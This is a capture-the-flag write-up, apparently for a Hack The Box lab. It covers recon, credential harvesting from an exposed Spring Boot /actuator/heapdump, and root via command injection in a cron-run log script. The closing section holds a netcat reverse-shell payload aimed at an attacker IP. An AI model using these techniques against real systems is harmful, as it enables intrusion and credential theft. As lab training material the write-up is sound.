## Initial Reconnaissance
Starting with an nmap scan to identify open ports and services:
```
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
8761/tcp open  http    syn-ack ttl 63 Apache Tomcat (language: en)
```
I ran `whatweb` to gather more information about the webserver:
```
$ whatweb -a 3 10.129.136.130
http://10.129.136.130 [301 Moved Permanently] Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.129.136.130], RedirectLocation[http://furni.htb/], Title[301 Moved Permanently], nginx[1.18.0]
ERROR Opening: http://furni.htb/ - no address for furni.htb
```
This showed I needed to add `furni.htb` to my `/etc/hosts` file to properly resolve the domain.
## Web Application Analysis
The website contains a login/register form. I tested for injection vulnerabilities and noticed an error when using a very long email:
```sql
could not execute statement [Data truncation: Data too long for column &#39;last_name&#39; at row 1] [insert into users (email,first_name,is_staff,last_name,password) values (?,?,?,?,?)]; SQL [insert into users (email,first_name,is_staff,last_name,password) values (?,?,?,?,?)]
```
This revealed information about the database structure and confirmed it was likely Spring Boot related. I also attempted to add an `is_staff=true` parameter during registration to gain privileged access, but it didn't work.
## Directory Enumeration
Using dirsearch, I discovered several interesting directories:
```
[03:26:46] 200 -    6KB - /actuator/env
[03:26:46] 200 -   15B  - /actuator/health
[03:26:46] 200 -    2B  - /actuator/info
[03:26:46] 200 -    3KB - /actuator/metrics
[03:26:46] 405 -  114B  - /actuator/refresh
[03:26:46] 200 -   54B  - /actuator/scheduledtasks
[03:26:46] 400 -  108B  - /actuator/sessions
[03:26:46] 200 -   36KB - /actuator/configprops
[03:26:46] 200 -   35KB - /actuator/mappings
[03:26:46] 200 -   99KB - /actuator/loggers
[03:26:46] 200 -  180KB - /actuator/conditions
[03:26:46] 200 -  198KB - /actuator/beans
[03:26:46] 200 -  132KB - /actuator/threaddump
[03:26:47] 400 -  106B  - /admin/%3bindex/
[03:26:48] 200 -   76MB - /actuator/heapdump
```
This confirmed the backend was running on Spring Boot. The `/actuator/heapdump` endpoint was particularly interesting as it provides a heap dump from the application's JVM, which could contain sensitive information.
## Finding Credentials in Heap Dump
I downloaded the heap dump file and began searching for unencrypted passwords:
```
$ strings ~/Downloads/heapdump | grep 'password' -a2 -b2
```
This revealed some interesting entries:
```
18842863-com.mysql.cj.exceptions.WrongArgumentException#
18842911-jdbc:mysql://localhost:3306/Furni_WebApp_DB
18842955:{password=0sc@r190_S0l!dP@sswd, user=oscar190}!
18843003-^+P#
18843008-com.mysql.cj.conf.ConnectionUrl!
```
Found JDBC connection credentials:
- Username: `oscar190`
- Password: `0sc@r190_S0l!dP@sswd`
Looking for potential HTTP requests:
```
$ strings ~/Downloads/heapdump | grep -E "^Host:\s+\S+$" -C 10
```
This revealed an HTTP request with Basic Auth:
```
X-Frame-Options: DENY
Content-Length: 0
Date: Thu, 01 Aug 2024 18:29:30 GMT
Keep-Alive: timeout=60
Connection: keep-alive
PUT /eureka/apps/FURNI/eureka:Furni:8082?status=UP&lastDirtyTimestamp=1722535252684 HTTP/1.1
Accept: application/json, application*;q=0.8
Accept-Language: en-US,en;q=0.8
Cache-Control: max-age=0
Content-Type: application/x-www-form-urlencoded
Cookie: SESSION=NjFhMTAxMDAtM2UxZi00Y2QyLTgwZmMtZDczYWVlNmFhNTAx
User-Agent: Mozilla/5.0 (X11; Linux x86_64)
Forwarded: proto=http;host=furni.htb;for="127.0.0.1:38464"
X-Forwarded-Port: 80
X-Forwarded-Host: furni.htb
host: 10.10.16.17:8081
username=miranda.wise%40furni.htb&password=IL%21veT0Be%26BeT0L0ve&_csrf=Eaz1o7Q2S6zhFBhhbWkJWOE_jmx0cSLNf-0UxudV6jAPLFHCI5SUlI1Uep_MciBXXEQ9PoRdow0SFBLgR4h39dVh3gM6Gmf3
```
I decoded the HTML-encoded password:
- `IL%21veT0Be%26BeT0L0ve` → `IL!veT0Be&BeT0L0ve`
I noticed a user directory in the home folder:
```
drwxr-x--- 8 miranda-wise miranda-wise 4096 Mar 21 13:26 miranda-wise
```
## Lateral Movement to miranda-wise
Using the credentials I captured, I was able to SSH in as `miranda-wise`.
## Privilege Escalation
After getting access as miranda-wise, I ran linpeas which revealed an interesting file:
```
/opt/log_analyze.sh
```
I used pspy64 to see if this script was being run by a privileged user:
```
2025/04/30 13:50:03 CMD: UID=0     PID=127920 | /bin/bash /opt/log_analyse.sh /var/www/web/cloud-gateway/log/application.log
```
This confirmed the script was being run by the root user. Inspecting the script, I noticed it used `grep -oP 'Status: \K.*'` to extract what comes after "Status:" in the log file.
The critical vulnerability was that the script extracted unsanitized input from the log file and assigned it directly to a variable, indicating a command substitution injection possibility.
## Root Shell via Command Injection
I crafted an exploit by injecting a command substitution within a log entry that would execute during variable assignment in the `analyze_http_statuses` function:
```bash
miranda-wise@eureka:~$ rm -rf /var/www/web/cloud-gateway/log/application.log
miranda-wise@eureka:~$ echo 'HTTP Status: x[$(busybox nc 10.10.16.17 3001 -e sh)]' > /var/www/web/cloud-gateway/log/application.log
miranda-wise@eureka:~$ /opt/log_analyse.sh /var/www/web/cloud-gateway/log/application.log
```
The `x[...]` wrapper would execute the reverse shell before failing any comparison in the script. After waiting for the script to be executed by the root cron job, I received a root shell on my netcat listener.

